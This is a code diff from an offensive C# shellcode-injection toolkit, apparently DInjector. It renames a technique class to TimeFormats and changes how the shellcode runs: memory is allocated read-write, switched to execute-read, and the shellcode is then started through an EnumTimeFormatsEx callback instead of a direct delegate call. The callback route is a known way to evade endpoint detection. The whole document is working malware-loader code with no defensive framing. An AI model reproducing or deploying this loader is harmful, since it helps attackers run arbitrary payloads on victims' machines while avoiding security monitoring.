@@ -6,7 +6,7 @@ using static DInvoke.Data.Native;
 
 namespace DInjector
 {
-    class FunctionPointer
+    class TimeFormats
     {
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate void pFunction();
@@ -28,9 +28,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(FunctionPointer) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
+                Console.WriteLine("(TimeFormats) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             else
-                throw new Exception($"(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(TimeFormats) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -50,14 +50,13 @@ namespace DInjector
                 ref oldProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(FunctionPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
+                Console.WriteLine("(TimeFormats) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             else
-                throw new Exception($"(FunctionPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+                throw new Exception($"(TimeFormats) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
 
             #endregion
 
-            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
-            f();
+            _ = Win32.EnumTimeFormatsEx(baseAddress, IntPtr.Zero, 0, 0);
 
             #region CleanUp: NtFreeVirtualMemory (shellcode)
 
@@ -70,9 +69,9 @@ namespace DInjector
                 DI.Data.Win32.Kernel32.MEM_RELEASE);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(FunctionPointer.CleanUp) [+] NtFreeVirtualMemory, shellcode");
+                Console.WriteLine("(TimeFormats.CleanUp) [+] NtFreeVirtualMemory, shellcode");
             else
-                throw new Exception($"(FunctionPointer.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");
+                throw new Exception($"(TimeFormats.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");
 
             #endregion
         }
